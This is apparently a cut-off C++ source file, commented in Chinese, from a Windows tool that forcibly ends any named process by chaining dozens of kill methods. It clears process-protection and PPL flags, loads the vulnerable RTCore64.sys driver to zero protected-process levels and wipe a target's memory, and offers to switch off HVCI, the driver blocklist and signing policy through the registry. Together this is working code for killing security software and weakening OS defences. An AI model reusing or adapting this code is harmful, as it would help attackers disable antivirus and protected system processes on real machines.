                                    ULONG breakOnTermination = 0;
                                    pNtSetInformationProcess(
                                        hTargetProcess,
                                        0x1D,
                                        &breakOnTermination,
                                        sizeof(breakOnTermination));
                                    
                                    // 方法3: 移除进程保护信息 (0x35)
                                    ULONG protectionInfo = 0;
                                    pNtSetInformationProcess(
                                        hTargetProcess,
                                        0x35,
                                        &protectionInfo,
                                        sizeof(protectionInfo));
                                    
                                    // 方法4: 移除进程签名级别 (0x37)
                                    ULONG signatureLevel = 0;
                                    pNtSetInformationProcess(
                                        hTargetProcess,
                                        0x37,
                                        &signatureLevel,
                                        sizeof(signatureLevel));
                                    
                                    // 方法5: 移除关键进程标志 (0x1D)
                                    ULONG criticalFlag = 0;
                                    pNtSetInformationProcess(
                                        hTargetProcess,
                                        0x1D,
                                        &criticalFlag,
                                        sizeof(criticalFlag));
                                    
                                    // 方法6: 设置进程为可调试 (绕过某些保护)
                                    ULONG debugFlags = 0;
                                    pNtSetInformationProcess(
                                        hTargetProcess,
                                        0x1E,
                                        &debugFlags,
                                        sizeof(debugFlags));
                                    
                                    // 方法7: 移除作业关联 (防止作业保护)
                                    typedef NTSTATUS(NTAPI* _NtSetInformationJobObject)(
                                        HANDLE JobHandle,
                                        JOBOBJECTINFOCLASS JobObjectInformationClass,
                                        PVOID JobObjectInformation,
                                        ULONG JobObjectInformationLength);
                                    
                                    _NtSetInformationJobObject pNtSetInformationJobObject =
                                        (_NtSetInformationJobObject)GetProcAddress(
                                            GetModuleHandle(L"ntdll.dll"),
                                            "NtSetInformationJobObject");
                                    
                                    if (pNtSetInformationJobObject) {
                                        HANDLE hJob = nullptr;
                                        pNtSetInformationJobObject(
                                            hJob,
                                            static_cast<JOBOBJECTINFOCLASS>(12),
                                            &hJob,
                                            sizeof(hJob));
                                    }
                                    
                                    // 方法8: 修改进程访问令牌
                                    typedef NTSTATUS(NTAPI* _NtSetInformationToken)(
                                        HANDLE TokenHandle,
                                        TOKEN_INFORMATION_CLASS TokenInformationClass,
                                        PVOID TokenInformation,
                                        ULONG TokenInformationLength);
                                    
                                    _NtSetInformationToken pNtSetInformationToken =
                                        (_NtSetInformationToken)GetProcAddress(
                                            GetModuleHandle(L"ntdll.dll"),
                                            "NtSetInformationToken");
                                    
                                    if (pNtSetInformationToken) {
                                        typedef struct _TOKEN_MANDATORY_POLICY {
                                            ULONG Policy;
                                        } TOKEN_MANDATORY_POLICY, *PTOKEN_MANDATORY_POLICY;
                                        
                                        TOKEN_MANDATORY_POLICY mandatoryPolicy = { 0 };
                                        pNtSetInformationToken(
                                            hTargetProcess,
                                            static_cast<TOKEN_INFORMATION_CLASS>(28),
                                            &mandatoryPolicy,
                                            sizeof(mandatoryPolicy));
                                    }
                                }
                                
                                // 每次循环尝试2次终止进程
                                TerminateProcess(hTargetProcess, 0);
                                TerminateProcess(hTargetProcess, 0);
                                
                                CloseHandle(hTargetProcess);
                            }
                        }
                        CloseHandle(hCsrss);
                    }
                }
                
            }
            
            // 方法3: 使用驱动程序
            // 加载内核驱动程序来执行特权操作
            
            // 方法4: 利用内核漏洞
            // 使用已知的内核漏洞来提升权限
            
            // 方法5: 使用ELAM驱动
            // ELAM驱动可以在早期启动时获得更高权限
        }
#endif
        return false;
    }
    catch (...) {
        return false;
    }
}

void RemoveCriticalProcessFlag(const std::string& processName)
{
    // 获取系统进程快照
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        std::wcerr << L"无法创建进程快照" << std::endl;
        return;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // 将输入的进程名转换为小写，用于不区分大小写的比较
    std::string targetNameLower = processName;
    std::transform(targetNameLower.begin(), targetNameLower.end(),
        targetNameLower.begin(), ::tolower);

    bool found = false;

    // 遍历所有进程
    if (Process32First(hSnapshot, &pe32))
    {
        do
        {
            // 将宽字符进程名转换为多字节字符串
            char currentProcessName[MAX_PATH];
            WideCharToMultiByte(CP_UTF8, 0, pe32.szExeFile, -1,
                currentProcessName, MAX_PATH, NULL, NULL);

            // 转换为小写进行比较
            std::string currentNameLower = currentProcessName;
            std::transform(currentNameLower.begin(), currentNameLower.end(),
                currentNameLower.begin(), ::tolower);

            // 检查是否匹配目标进程名
            if (currentNameLower == targetNameLower)
            {
                found = true;

                // 找到匹配进程，尝试移除关键标识
                HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
                if (hProcess != nullptr)
                {
                    // 使用NtSetInformationProcess移除关键标识
                    typedef NTSTATUS(NTAPI* pNtSetInformationProcess)(
                        HANDLE ProcessHandle,
                        ULONG ProcessInformationClass,
                        PVOID ProcessInformation,
                        ULONG ProcessInformationLength);

                    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
                    if (hNtdll)
                    {
                        pNtSetInformationProcess NtSetInformationProcess =
                            reinterpret_cast<pNtSetInformationProcess>(
                                GetProcAddress(hNtdll, "NtSetInformationProcess"));

                        if (NtSetInformationProcess)
                        {
                            DWORD breakOnTermination = 0;
                            NTSTATUS status = NtSetInformationProcess(
                                hProcess,
                                29, // ProcessBreakOnTermination
                                &breakOnTermination,
                                sizeof(breakOnTermination));

                            // 记录操作结果
                            if (NT_SUCCESS(status))
                            {
                                std::wcout << L"成功移除进程 " << pe32.szExeFile
                                    << L" (PID: " << pe32.th32ProcessID
                                    << L") 的关键标识" << std::endl;
                            }
                        }
                        else
                        {
                            std::wcout << L"无法获取NtSetInformationProcess函数地址" << std::endl;
                        }
                    }
                    else
                    {
                        std::wcout << L"无法加载ntdll.dll模块" << std::endl;
                    }

                    CloseHandle(hProcess);
                }
                else
                {
                    std::wcout << L"无法打开进程 " << pe32.szExeFile
                        << L" (PID: " << pe32.th32ProcessID
                        << L")，错误代码: " << GetLastError() << std::endl;
                }
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    if (!found)
    {
        std::wcout << L"未找到进程: " << processName.c_str() << std::endl;
    }

    CloseHandle(hSnapshot);
}
// ============================================================================
// 统一系统进程白名单 (全局唯一，供所有功能模块共用)
// ============================================================================
static const wchar_t* g_UnifiedSystemProcessWhitelist[] = {
    // === Windows 核心系统进程 (不可终止) ===
    L"[System Process]",          // 系统空闲进程 (PID 0)
    L"System",                    // 内核 (PID 4)
    L"Secure System",             // 安全系统进程
    L"Registry",                  // 注册表进程
    L"Memory Compression",        // 内存压缩
    L"smss.exe",                  // 会话管理器
    L"csrss.exe",                 // 子系统进程
    L"wininit.exe",               // Windows 初始化
    L"winlogon.exe",              // 登录管理器
    L"services.exe",              // 服务控制管理器
    L"lsass.exe",                // 本地安全认证
    L"svchost.exe",              // 服务宿主
    L"dllhost.exe",              // COM+ 宿主
    L"fontdrvhost.exe",          // 字体驱动宿主
    
    // === 桌面/Shell 进程 ===
    L"dwm.exe",                  // 窗口管理器
    L"explorer.exe",             // 资源管理器
    L"sihost.exe",               // Shell Infrastructure
    L"taskhostw.exe",            // Task Host for Windows
    L"RuntimeBroker.exe",        // 运行时代理
    L"ShellHost.exe",            // Shell Host
    L"conhost.exe",              // 控制台窗口宿主
    L"ctfmon.exe",              // 输入法相关
    
    // === 安全/防护进程 ===
    L"LsaIso.exe",              // LSA 隔离
    L"NgcIso.exe",              // 凭据隔离
    L"smartscreen.exe",         // SmartScreen 过滤器
    
    // === 搜索/索引 ===
    L"SearchHost.exe",          // 搜索宿主
    L"SearchIndexer.exe",       // 索引服务
    L"SearchProtocolHost.exe",  // 搜索协议宿主
    L"SearchFilterHost.exe",    // 搜索过滤器宿主
    
    // === WMI/管理服务 ===
    L"WmiPrvSE.exe",            // WMI Provider
    L"WMIRegistrationService.exe", // WMI 注册服务
    L"WmiApSrv.exe",            // WMI 反性能适配器
    L"unsecapp.exe",            // WMI 不安全应用
    
    // === 小组件/现代 UI ===
    L"Widgets.exe",             // 小组件
    L"WidgetService.exe",       // 小组件服务
    L"UserOOBEBroker.exe",      // 用户 OOBE 代理
    L"TextInputHost.exe",       // 文本输入宿主
    L"AggregatorHost.exe",      // 聚合器宿主
    L"backgroundTaskHost.exe",  // 后台任务宿主
    
    // === 文件同步/存储 ===
    L"FileSyncHelper.exe",      // 文件同步助手
    L"FileCoAuth.exe",          // 文件协作认证
    L"OneDrive.exe",            // OneDrive 客户端
    L"ImgLocalVisionModelHelper64.exe", // 视觉模型助手
    L"WUDFHost.exe",            // 用户模式驱动框架
    
    // === 网络/连接 ===
    L"wlanext.exe",             // WLAN 扩展
    L"NetSetupSvc.exe",         // 网络设置服务
    L"WorkFolders.exe",         // 工作文件夹
    
    // === 安全软件 (赛门铁克) ===
    L"SECOCL64.exe",            // 赛门铁克
    L"SECOMN64.exe",            // 赛门铁克通信
    
    // === Intel 显卡/图形驱动 ===
    L"IntelCpHDCPSvc.exe",      // Intel HDCP 内容保护
    L"igfxCUIServiceN.exe",     // Intel 显卡控制面板服务
    L"igfxEMN.exe",             // Intel 显卡扩展
    L"igfxextN.exe",            // Intel 显卡外部
    L"IntelGraphicsSoftware.Service.exe", // Intel 显卡软件服务
    L"IntelGraphicsSoftware.exe",         // Intel 显卡软件
    L"OneApp.IGCC.WinService.exe",        // Intel 显卡命令中心服务
    L"DisplayControlService.exe",         // Intel 显示控制服务
    L"DisplayControl.exe",                // Intel 显示控制
    L"PresentMonService.exe",             // Intel PresentMon 服务
    
    // === Intel 其他服务 ===
    L"IntelAudioService.exe",   // Intel 音频服务
    L"RstMwService.exe",        // Intel 快速存储服务
    L"jhi_service.exe",         // Intel DAL 宿主接口
    L"SurSvc.exe",              // Intel SUR 服务
    L"TbtP2pShortcutService.exe", // Intel 雷电服务
    L"DSAService.exe",          // Intel 驱动支持助手
    L"DSAUpdateService.exe",    // Intel DSA 更新服务
    L"DSATray.exe",             // Intel DSA 托盘
    L"AppHelperCap.exe",        // Intel 能力许可助手
    L"DiagsCap.exe",            // Intel 诊断能力
    L"NetworkCap.exe",          // Intel 网络能力
    L"SysInfoCap.exe",          // Intel 系统信息能力
    L"esrv.exe",                // Intel 能源服务器
    L"esrv_svc.exe",            // Intel 能源服务器服务
    
    // === Realtek 音频 ===
    L"RtkAudUService64.exe",    // Realtek 音频服务
    L"cthelper.exe",            // Creative 音频驱动助手
    
    // === 触控板/指纹 ===
    L"SynTPEnhService.exe",     // Synaptics 触控板服务
    L"SynTPEnh.exe",            // Synaptics 触控板增强
    L"ELANFPService.exe",       // ELAN 指纹服务
    
    // === 输入法 ===
    L"ChsIME.exe",              // 微软中文输入法
    L"TabTip.exe",              // 触摸键盘
    
    // === 打印服务 ===
    L"spoolsv.exe",             // 打印后台处理
    
    // === 音频 ===
    L"audiodg.exe",             // 音频设备图形化
    L"MidiSrv.exe",             // MIDI 服务
    
    // === 浏览器 (用户可能正在使用) ===
    L"msedge.exe",              // Microsoft Edge
    L"msedgewebview2.exe",      // Edge WebView2 运行时
    L"identity_helper.exe",     // Edge 身份助手
    L"elevation_service.exe",   // Chrome 提权服务
    L"crashpad_handler.exe",    // Chromium 崩溃处理
    
    // === 虚拟化 ===
    L"vmtoolsd.exe",            // VMware Tools
    L"vmware-authd.exe",        // VMware 认证服务
    L"vmnetdhcp.exe",           // VMware 虚拟网络DHCP
    L"vmware-usbarbitrator64.exe", // VMware USB仲裁
    L"vmnat.exe",               // VMware NAT服务
    L"vmware-tray.exe",         // VMware 托盘
    
    // === 其他重要系统进程 ===
    L"rundll32.exe",            // DLL 执行宿主
    L"notepad.exe",             // 记事本 (防止误关)
    L"cmd.exe",                 // 命令提示符
    L"WindowsExplorer.exe",    // Explorer 别名
    
    // === 电源/事件/更新 ===
    L"UsoClient.exe",           // 更新会话编排客户端
    L"MoUsoCoreWorker.exe",     // Microsoft 更新核心工作进程
    L"usocoreworker.exe",       // 更新服务核心工作进程
    L"MusNotifyIcon.exe",       // Microsoft 更新通知图标
    L"TiWorker.exe",            // Trusted Installer 工作进程
    L"TrustedInstaller.exe",    // Trusted Installer 主进程
    L"sppsvc.exe",              // 软件保护平台服务
    
    // === 诊断/反馈 ===
    L"CompatTelRunner.exe",     // 兼容性遥测
    L"dwminit.exe",             // DWM 初始化
    
    // === GPU/图形 ===
    L"dxdiag.exe",              // DirectX 诊断(偶尔运行)
    
    // === 系统信息/任务 ===
    L"taskeng.exe",             // 任务引擎
    L"sdiagnhost.exe",          // 脚本诊断宿主
    
    // === 远程/桌面 ===
    L"rdpclip.exe",             // 远程桌面剪贴板
    L"rdpinput.exe",            // 远程桌面输入
    L"RdpShell.exe",            // 远程桌面Shell
    
    // === 字体/语言 ===
    L"LanguageComponentsInstaller.exe", // 语言组件安装器
    
    // === 应用模型 ===
    L"ApplicationFrameHost.exe", // UWP 应用框架宿主
    L"Calculator.exe",          // 计算器(UWP)
    L"SettingSyncHost.exe",     // 设置同步宿主
    L"SystemSettings.exe",      // 系统设置(UWP)
    L"StartMenuExperienceHost.exe", // 开始菜单体验宿主
    L"SearchApp.exe",           // 搜索应用(Cortana遗留)
    L"ShellExperienceHost.exe", // Shell 体验宿主
    
    // === Hyper-V/虚拟化 ===
    L"vmms.exe",                // 虚拟机管理服务
    L"vmcompute.exe",           // 虚拟机计算服务
    L"Vmmem.exe",               // 虚拟机内存进程
    L"vmwp.exe",                // 虚拟机工作进程
    
    // === 打印/传真 ===
    L"PrintDialog.exe",         // 打印对话框
    
    // === 系统恢复 ===
    L"RecoveryDrive.exe",       // 恢复驱动器
    L"VSSVC.exe"                // 卷影复制服务
};

// 白名单大小(用于快速迭代)
static const size_t g_WhitelistCount = sizeof(g_UnifiedSystemProcessWhitelist) / sizeof(g_UnifiedSystemProcessWhitelist[0]);

// 快速检查: 进程名是否在统一白名单中 (大小写不敏感)
static bool IsInUnifiedWhitelist(const std::wstring& processName) {
    std::wstring lowerName = processName;
    std::transform(lowerName.begin(), lowerName.end(), lowerName.begin(), ::towlower);
    
    for (size_t i = 0; i < g_WhitelistCount; i++) {
        std::wstring wname = g_UnifiedSystemProcessWhitelist[i];
        std::transform(wname.begin(), wname.end(), wname.begin(), ::towlower);
        if (lowerName == wname) {
            return true;
        }
    }
    return false;
}

// 兼容旧接口: ProcessTerminator 命名空间使用 (委托给统一白名单)
bool ProcessTerminator::IsSystemProcessWhitelisted(const std::wstring& processName) {
    return IsInUnifiedWhitelist(processName);
}

// ============= [DMSP v5.3 集成] 驱动方法签名校验回调 =============
//   全局静态回调: 由 PplDriver::DmspVerify 在 0x3001/0x3002/0x3003 时调用
//   校验失败 -> TriggerResponse + 返回 false (驱动方法拒绝执行)
static bool dmspDriverVerifyCallback(unsigned int verifyId) {
    // 调用前: 确保 DMSP 状态已初始化
    if (!DMSP::g_state.initialized) {
        DMSP::InitializeState();
    }
    // 完整签名验证 (全量, 用于驱动操作)
    auto result = UnifiedValidator::PerformFullValidation(false);
    if (!result.passed) {
        ResponseSystem::TriggerResponse("Driver method signature check failed", 2);
        return false;
    }
    return true;
}

// 调用所有方法
bool ProcessTerminator::terminateByAllMethods(const std::string& processName) {
    GQ(processName);

    // ============= [DMSP v5.3 集成] 注入驱动方法签名校验回调 =============
    //   ppl_driver.h 通过 SetDmspVerifyCallback 接收回调
    //   校验 ID 约定:
    //     0x3001 - DisablePplForPid (单 PID PPL 清零)
    //     0x3002 - DisablePplForPidsBulk (批量 PPL 清零)
    //     0x3003 - ScanAndEraseVadMemory (VAD 内存清零)
    //     0x3004 - StopServicesByPids (按 PID 反查停止服务)
    // 一次性注入 (线程安全由 DmspInternal::DmspVerifyCallbackRef 内 static 保证)
    ::SetDmspVerifyCallback(dmspDriverVerifyCallback);

    // 启动时清理上次进程崩溃可能残留的驱动服务 + .sys 文件
    PplDriver::CleanupLeftoverDrivers();

    // ============= [预处理] 自动去除目标进程 PPL (一次) =============
    //   目标: 让 73 种常规方法在 PPL 已清的状态下工作
    //   - WDAC 启用 -> 返回 -3, 提示用户手动重启关闭
    //   - HVCI/Blocklist/Policy 已启用 -> 先询问用户是否关闭
    //   - Win7 -> 跳过 (无 PPL 概念)
    //   - 驱动加载失败 -> 静默继续, 后续方法兜底
    //   - 驱动加载成功 -> 遍历目标 PID 清零 SignatureLevel
    {
        std::vector<int> prepPids = getPIDsByName(processName);
        if (!prepPids.empty()) {
            std::vector<DWORD> dwordPids;
            dwordPids.reserve(prepPids.size());
            for (int p : prepPids) dwordPids.push_back((DWORD)p);

            // 检查可自动关闭的拦截项 (HVCI / DriverBlocklist / WHQLPolicy)
            //   WDAC 不可自动关闭, 不在询问范围
            bool hvci, blocklist, whql, wdac;
            PplDriver::GetBlockStatus(hvci, blocklist, whql, wdac);
            bool canAutoFix = (hvci || blocklist || whql) && !wdac;
            bool hasAnyBlock = (hvci || blocklist || whql || wdac);

            // 打印拦截状态
            if (hasAnyBlock) {
                std::wcout << L"[预处理] 拦截状态: ";
                if (hvci)      std::wcout << L"HVCI ";
                if (blocklist) std::wcout << L"DriverBlocklist ";
                if (whql)      std::wcout << L"WHQLPolicy ";
                if (wdac)      std::wcout << L"WDAC(需手动关闭) ";
                std::wcout << std::endl;
            }

            // 询问用户是否自动关闭可关闭项 (仅 HVCI/Blocklist/WHQL, 含 WDAC 时不提示)
            if (canAutoFix) {
                std::wcout << L"[预处理] 检测到可自动关闭的拦截项 (HVCI/DriverBlocklist/WHQLPolicy)" << std::endl;
                std::wcout << L"          关闭后需重启才能加载驱动, 是否自动关闭? (y/n): ";
                wchar_t choice = _getwch();
                std::wcout << choice << std::endl;
                if (choice == L'y' || choice == L'Y') {
                    std::wcout << L"[预处理] 正在关闭拦截项..." << std::endl;
                    if (hvci)      PplDriver::Hvci::AutoDisable();
                    if (blocklist) PplDriver::DriverBlocklist::AutoDisable();
                    if (whql)      PplDriver::DriverPolicy::AutoDisable();
                    std::wcout << L"[预处理] 已写入注册表, 重启后生效" << std::endl;
                } else {
                    std::wcout << L"[预处理] 用户选择不关闭拦截项, 驱动可能无法加载" << std::endl;
                }
            } else if (wdac) {
                std::wcout << L"[预处理] WDAC 已启用且无法自动关闭, 需手动重启到恢复模式关闭" << std::endl;
            }

            size_t prepRet = PplDriver::DisablePplForPidsBulk(dwordPids);
            if (prepRet == (size_t)-1) {
                std::wcout << L"[预处理] 已写入注册表 (HVCI/Blocklist/Policy), 重启后生效" << std::endl;
            } else if (prepRet > 0) {
                std::wcout << L"[预处理] 已自动去除 " << prepRet << L" 个目标进程的 PPL" << std::endl;
            } else {
                // 0 或其他: 静默, 不影响后续
            }
        }
    }

    // 阻止目标进程访问关键系统进程（方法0，不计入71种方法）
    std::wcout << L"[方法0] 正在阻止目标进程访问关键系统进程..." << std::endl;

    // 使用统一系统进程白名单
    std::vector<std::wstring> protectedProcessesW(
        g_UnifiedSystemProcessWhitelist,
        g_UnifiedSystemProcessWhitelist + g_WhitelistCount
    );

    // 获取目标进程的PID
    std::vector<int> targetPids = getPIDsByName(processName);

    // [v5.2 修复崩溃/卡住] 之前用 detach 导致:
    //   1. 进程被自己终止时,后台线程访问已销毁的栈变量 → 崩溃
    //   2. 块作用域变量析构后,后台线程还在跑 → 竞态 + 死循环
    // 修复: 用 RAII 风格的 std::thread + scoped guard,函数结束前 join
    if (!targetPids.empty()) {
        std::atomic<bool> blockThreadRunning(true);

        // [关键] 用 std::unique_ptr 包装 thread,确保函数退出前 join
        std::thread blockThread([&protectedProcessesW, &blockThreadRunning, targetPids, processName]() {
            // 创建JOB对象来限制进程
            HANDLE hJob = CreateJobObject(NULL, NULL);
            if (hJob) {
                JOBOBJECT_BASIC_LIMIT_INFORMATION jobLimit = { 0 };
                jobLimit.LimitFlags = JOB_OBJECT_LIMIT_PROCESS_TIME;
                jobLimit.PerJobUserTimeLimit.QuadPart = 10000000; // 10秒CPU时间限制
                SetInformationJobObject(hJob, JobObjectBasicLimitInformation, &jobLimit, sizeof(jobLimit));

                // 将目标进程添加到JOB
                HANDLE hTarget = OpenProcess(PROCESS_SET_QUOTA | PROCESS_TERMINATE, FALSE, targetPids[0]);
                if (hTarget) {
                    AssignProcessToJobObject(hJob, hTarget);
                    CloseHandle(hTarget);
                }
            }

            while (blockThreadRunning.load(std::memory_order_relaxed)) {
                // [关键] 检查目标进程是否还存在,避免在已终止进程上浪费时间
                HANDLE hTarget = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPids[0]);
                if (!hTarget || hTarget == INVALID_HANDLE_VALUE) {
                    // 目标进程已终止或无权限,退出循环
                    break;
                }

                // 检查目标进程是否就是自己(防止自杀后无法继续)
                if (GetProcessId(hTarget) == GetCurrentProcessId()) {
                    CloseHandle(hTarget);
                    break;
                }

                // 遍历所有受保护的进程
                for (const auto& protectedProcess : protectedProcessesW) {
                    // 获取受保护进程的PID (wstring -> string 转换)
                    std::string processNameA(protectedProcess.begin(), protectedProcess.end());
                    std::vector<int> protectedPids = getPIDsByName(processNameA);
                    for (int protectedPid : protectedPids) {
                        if (protectedPid > 0) {
                            // 尝试关闭指向受保护进程的句柄
                            typedef NTSTATUS (NTAPI* _NtDuplicateObject)(
                                HANDLE SourceProcessHandle,
                                HANDLE SourceHandle,
                                HANDLE TargetProcessHandle,
                                PHANDLE TargetHandle,
                                ACCESS_MASK DesiredAccess,
                                ULONG HandleAttributes,
                                ULONG Options);

                            HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
                            if (hNtdll) {
                                _NtDuplicateObject pNtDuplicateObject = (_NtDuplicateObject)GetProcAddress(hNtdll, "NtDuplicateObject");
                                if (pNtDuplicateObject) {
                                    HANDLE hDuplicated = nullptr;
                                    pNtDuplicateObject(hTarget, reinterpret_cast<HANDLE>(static_cast<uintptr_t>(-1)), GetCurrentProcess(), &hDuplicated, 0, 0, 0x1);
                                }
                            }
                        }
                    }
                }

                // 方法2: 尝试将目标进程添加到受保护的JOB
                if (hJob) {
                    BOOL inJob = FALSE;
                    if (IsProcessInJob(hTarget, hJob, &inJob) && !inJob) {
                        AssignProcessToJobObject(hJob, hTarget);
                    }
                }

                // 方法3: 尝试修改目标进程的优先级
                SetPriorityClass(hTarget, IDLE_PRIORITY_CLASS);
                SetProcessPriorityBoost(hTarget, TRUE);

                // 方法4: 尝试挂起目标进程的所有线程
                HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, targetPids[0]);
                if (hSnap != INVALID_HANDLE_VALUE) {
                    THREADENTRY32 te = { 0 };
                    te.dwSize = sizeof(te);
                    while (Thread32Next(hSnap, &te)) {
                        if (te.th32OwnerProcessID == (DWORD)targetPids[0]) {
                            HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
                            if (hThread) {
                                SuspendThread(hThread);
                                CloseHandle(hThread);
                            }
                        }
                    }
                    CloseHandle(hSnap);
                }

                // 方法5: 尝试关闭目标进程
                TerminateProcess(hTarget, 0);
                CloseHandle(hTarget);

                // 方法6: 使用系统命令尝试终止进程
                system(("taskkill /F /PID " + std::to_string(targetPids[0]) + " >nul 2>&1").c_str());
            }

            // 清理JOB对象
            if (hJob) {
                TerminateJobObject(hJob, 0);
                CloseHandle(hJob);
            }
        });

        // [关键] 使用 RAII guard 确保函数退出前 join 后台线程
        struct ThreadJoiner {
            std::thread& t;
            std::atomic<bool>& flag;
            ~ThreadJoiner() {
                // 1. 设置停止标志,通知后台线程退出
                flag.store(false, std::memory_order_release);
                // 2. 等待后台线程结束(join)
                if (t.joinable()) {
                    t.join();
                }
            }
        };
        ThreadJoiner joiner{blockThread, blockThreadRunning};

        // 注意: joiner 会在本作用域结束时自动 join 后台线程
        // (在 return 之前调用析构函数)
    }

    // ============= [方法 1] 基于驱动的 VAD 内存扫描与删除 (前置操作完成后立即执行) =============
    //   前置: PPL 已去除 (方法 0 已阻止目标访问关键进程) + 驱动已加载
    //   目标: 通过 RTCore64.sys 读 EPROCESS.VadRoot 遍历 VAD 树, 精确定位
    //         目标进程所有已分配的用户态内存区域, 在合法 VAD 范围内清零
    //   适用: 目标进程有自保护逻辑, 常规方法被杀会重启; 此时通过驱动读 VAD
    //         找到保护代码所在区域并清零, 强制失效
    //   位置: 作为第 1 种方法 (前置操作完成后), 原 71 种方法顺延为 2-72
    //
    //   [DMSP v5.3 校验植入] 此方法涉及驱动加载/内核读写, 是高敏感操作:
    //     - 方法 1 块开始: DMSP_VERIFY(0x2010) 二级验证, 失败时通过 TriggerResponse 报告
    //     - 每个 PID 调用前: DMSP_VERIFY(0x2011) 三级验证, 防止补丁注入绕过签名
    //     - 校验失败: 不执行 VAD 清零, 直接走 71 种方法链
    // ----------------------------------------------------------------------------
    {
        // [DMSP v5.3] 二级签名验证 - 驱动 VAD 内存清零子函数
        //   校验失败 -> 跳过方法 1, 走 71 种方法链兜底
        if (DMSP::g_state.initialized) {
            if (!UnifiedValidator::PerformQuickVerification(0x2010)) {
                // 校验失败, 不执行 VAD 清零
            } else {
                std::vector<int> driverPids = getPIDsByName(processName);
                if (!driverPids.empty()) {
                    std::wcout << L"[方法1] 基于驱动扫描 VAD 树并清零内存区域..." << std::endl;
                    int totalErased = 0;
                    for (int pid : driverPids) {
                        // [DMSP v5.3] 三级签名验证 - 每次 VAD 清零前
                        //   校验 ppl_driver.h 中关键函数体 CRC, 防止攻击者 hook ScanAndEraseVadMemory
                        if (DMSP::g_state.initialized) {
                            auto _dmsp_vad_verify = UnifiedValidator::PerformFullValidation(false);
                            if (!_dmsp_vad_verify.passed) {
                                continue;
                            }
                        }

                        PplDriver::ScanAndEraseVadMemory((DWORD)pid, totalErased);
                    }
                    if (totalErased > 0) {
                        std::wcout << L"[方法1] 已清零 " << totalErased << L" 个 VAD 区域" << std::endl;
                    } else {
                        std::wcout << L"[方法1] VAD 扫描未发现可清零区域" << std::endl;
                    }
                }
            }
        } else {
            // DMSP 未初始化, 跳过校验, 直接执行
            std::vector<int> driverPids = getPIDsByName(processName);
            if (!driverPids.empty()) {
                std::wcout << L"[方法1] 基于驱动扫描 VAD 树并清零内存区域..." << std::endl;
                int totalErased = 0;
                for (int pid : driverPids) {
                    PplDriver::ScanAndEraseVadMemory((DWORD)pid, totalErased);
                }
                if (totalErased > 0) {
                    std::wcout << L"[方法1] 已清零 " << totalErased << L" 个 VAD 区域" << std::endl;
                } else {
                    std::wcout << L"[方法1] VAD 扫描未发现可清零区域" << std::endl;
                }
            }
        }
    }

    // 定义方法列表
    typedef bool (*TerminateMethod)(const std::string&);
    TerminateMethod methods[] = {
        terminateByProcessName,
        terminateByDirectMemoryZeroing,
        terminateByServiceDetection,
        terminateByPPLBypass,
        terminateBySystemCommand,
        terminateByPhantomKiller,
        terminateByParentChildRelationship,
        terminateByProcessIsolationAndBlocking,
        terminateByWindowHandle,
        terminateByDebugging,
        terminateByPriorityManipulation,
        terminateByNativeAPI,
        terminateByHandleEnumeration,
        terminateByMemoryPatching,
        terminateByProcessIsolationAndAPIDisruption,
        terminateByKernelMemoryManipulation,
        terminateByObCallbacks,
        terminateByProcessObjectManipulation,
        terminateBySecurityDescriptorModification,
        terminateByWMI,
        terminateByAdvancedIsolation,
        terminateByCriticalProcessFlag,
        terminateByMemoryCorruption,
        terminateByHandleCloning,
        terminateByDesktopIsolation,
        terminateByTokenPrivilegeRemoval,
        terminateByRegistryModification,
        terminateByServiceControl,
        terminateByCOMObjectManipulation,
        terminateByNetworkIsolation,
        terminateByPowerManagement,
        terminateByUIAutomation,
        terminateByRandomizedMethods,
        terminateByThreadSuspension,
        terminateByProcessDebugPort,
        terminateByProcessHandleTable,
        terminateByProcessWorkingSet,
        terminateByProcessPagePriority,
        terminateByProcessIoPriority,
        terminateByProcessCycleTime,
        terminateByProcessCookie,
        terminateByImageSignatureEnforcement,
        terminateByCodeIntegrityViolation,
        terminateByExtendedPolicyFramework,
        terminateByMemoryPartitionCorruption,
        terminateByThreadPoolInfrastructure,
        terminateByExceptionChainCorruption,
        terminateBySecuritySubsystemBypass,
        terminateByVirtualizationInfrastructure,
        terminateByProcessDepletion,
        terminateByProcessAttach,
        terminateByProcessDetach,
        terminateByProcessFault,
        terminateByProcessInterlock,
        terminateByHandleInheritance,
        terminateByMemoryZeroing,
        terminateByThreadHijacking,
        terminateByExceptionInjection,
        terminateByMessageFlooding,
        terminateByProcessTree,
        terminateByTokenReplacement,
        terminateByAPCInjection,
        terminateByProcessVault,
        terminateByProcessDynamicCodePolicy,
        terminateByProcessControlFlowGuard,
        terminateByProcessSignaturePolicy,
        terminateByProcessEnergyManagement,
        terminateByProcessStateExtension,
        terminateByProcessFaultTolerance,
        terminateByProcessActivityModeration,
        terminateByProcessVirtualizationBasedSecurity,
        terminateByTaskManagerMethod,
        terminateByProcessIsolation,
        terminateByPracticalRing0Call
    };

    int methodCount = sizeof(methods) / sizeof(methods[0]);

    std::cout << "尝试使用 " << methodCount << " 种方法终止进程: " << processName << std::endl;

    bool processWasRunning = isProcessRunning(processName);
        for (int i = 0; i < methodCount; i++) {
            // 方法23、47、59、72 重试不同次数 (又插入PhantomKiller id 1)
            int retryCount = 2;
            if (i == 58) {
                retryCount = 8;
            } else if (i == 22 || i == 46 || i == 71) {
                retryCount = 4;
            } else if (i == methodCount - 1) {
                retryCount = 1;
            }
            
            for (int retry = 0; retry < retryCount; retry++) {
                try {
                    if (retryCount > 1) {
                        RemoveCriticalProcessFlag(processName);
                    }

                    // 仅每方法的第一轮打印进度
                    if (retry == 0)
                        std::cout << "方法 " << (i + 1) << "/" << methodCount
                                  << (retryCount > 1 ? " (重试)" : "") << "..." << std::endl;

                    methods[i](processName);

                    // 检查进程是否已终止
                    if (!isProcessRunning(processName)) {
                        std::cout << "方法 " << (i + 1) << " 成功终止进程!" << std::endl;
                        return true;
                    }
                }
                catch (const std::exception& e) {
